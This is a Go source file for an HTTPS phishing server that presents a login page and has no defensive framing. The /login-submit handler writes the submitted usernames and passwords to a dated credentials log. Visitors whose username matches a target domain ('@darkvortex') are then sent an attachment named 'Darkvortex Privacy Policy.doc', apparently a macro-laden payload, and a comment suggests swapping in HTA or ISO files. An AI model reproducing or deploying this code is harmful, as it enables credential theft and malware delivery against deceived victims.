package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func logRequest(request *http.Request) {
	logBuffer := fmt.Sprintf("[+] Verb: %s\n", request.Method) +
		fmt.Sprintf("[+] Remote Address: %s\n", request.RemoteAddr) +
		fmt.Sprintf("[+] Request URI: %s\n", request.RequestURI)

	headerlist := request.Header
	for x, y := range headerlist {
		logBuffer += fmt.Sprintf("[+] %s: %s\n", x, y)
	}

	logBuffer +=
		fmt.Sprintf("[+] Time: %s\n", time.Now().String()) +
			fmt.Sprintf("[+] Protocol: %s\n", request.Proto)

	switch request.Method {
	case "GET":
		logBuffer += fmt.Sprintf("[+] Get Form: %s\n", request.Form)
	case "POST":
		post_body, err := ioutil.ReadAll(request.Body)
		if err == nil {
			logBuffer += fmt.Sprintf("[+] Post Body:\n%s\n", post_body)
		}
	}
	logBuffer += "---------------------------------------------------------------------------------->\n\n"

	log_file := time.Now().UTC().Format("01-02-2006") + ".log"
	file, err := os.OpenFile(log_file, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	log.SetOutput(file) //writes as a logger
	log.Println(logBuffer)
}

func returnError(request *http.Request, response http.ResponseWriter) {
	logRequest(request)
	returnResponse := map[string]interface{}{
		"error": "404 not found",
	}
	json_response, _ := json.Marshal(returnResponse)
	response.Header().Set("Content-Type", "application/json")
	response.Write(json_response)
}

func login_func(response http.ResponseWriter, request *http.Request) {
	switch request.Method {
	case "GET":
		returnError(request, response)
	case "POST":
		err := request.ParseForm()
		if err != nil {
			returnError(request, response)
			return
		}
		log_file := "creds_" + time.Now().UTC().Format("01-02-2006") + ".log"
		file, err := os.OpenFile(log_file, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			// todo: return valid error
			returnError(request, response)
			return
		}
		log.SetOutput(file) //writes as a logger
		defer file.Close()
		log.Println("[+] Remote Address:", request.RemoteAddr)
		log.Println("[+] Useragent:", request.UserAgent())
		log.Println("[+] Time (UTC):", time.Now().UTC().String())

		invalidUsername := false
		for key, value := range request.Form {
			if key == "UsernameForm" {
				for i := range value {
					if strings.Contains(value[i], "@darkvortex") {
						log.Printf("[+] Username :%s\n", value)
					} else {
						log.Printf("[+] Suspicious Username :%s\n", value)
						invalidUsername = true
					}
				}
			} else {
				log.Printf("[+] Password :%s\n", value)
			}
		}
		log.Printf("-------------------------------------------|\n\n")

		if invalidUsername {
			http.ServeFile(response, request, "./static/index.html")
			return
		} else {
			content, err := ioutil.ReadFile("MacroFile.doc")
			if err != nil {
				// todo: remove this and send some legit error to user
				http.ServeFile(response, request, "./static/index.html")
				return
			}
			// filename below can be anything depending upon what your are serving: Example: Doc, Hta, ISO etc.
			response.Header().Set("Content-Disposition", "attachment; filename=Darkvortex Privacy Policy.doc")
			response.Header().Set("Content-Type", "application/msword")
			response.Write(content)
		}

	default:
		returnError(request, response)
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("Usage: %s <port> <ssl-certificate> <ssl-key>\n", os.Args[0])
		os.Exit(0)
	}
	port := os.Args[1]
	cert := os.Args[2]
	key := os.Args[3]

	fs := http.FileServer(http.Dir("./static"))

	http.Handle("/", fs)
	http.HandleFunc("/login-submit", login_func)

	log.Printf("Listening on https://0.0.0.0:%s...\n", port)
	err := http.ListenAndServeTLS(":"+port, cert, key, nil)
	if err != nil {
		log.Fatal(err.Error())
	}
}
